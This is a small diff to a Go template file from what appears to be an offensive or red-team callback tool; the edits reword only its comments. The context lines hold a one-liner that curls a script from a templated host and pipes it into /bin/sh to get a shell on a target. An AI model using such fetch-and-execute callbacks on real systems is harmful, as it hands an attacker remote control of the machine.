@@ -1,6 +1,6 @@
 {{- /*
      * default.tmpl
-     * Callback script template
+     * Callback script (and more) template
      * By J. Stuart McMurray
      * Created 20240325
      * Last Modified 20250115
@@ -12,8 +12,8 @@ curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.Host}}
 {{- end -}}
 
 {{/* callback is a one-liner used for getting a shell on target.  It more or
-   * less sends the script subtemplate to a shell.  This is the one-liner one
-   * copy/pastes to a target. */}}
+   * less sends the "script" subtemplate, below, to a shell.  This is the
+   * one-liner one copy/pastes to a target. */}}
 {{- define "callback" -}}
 {{template "curl" .}}/{{.URLPaths.Script}} | /bin/sh
 {{- end -}}
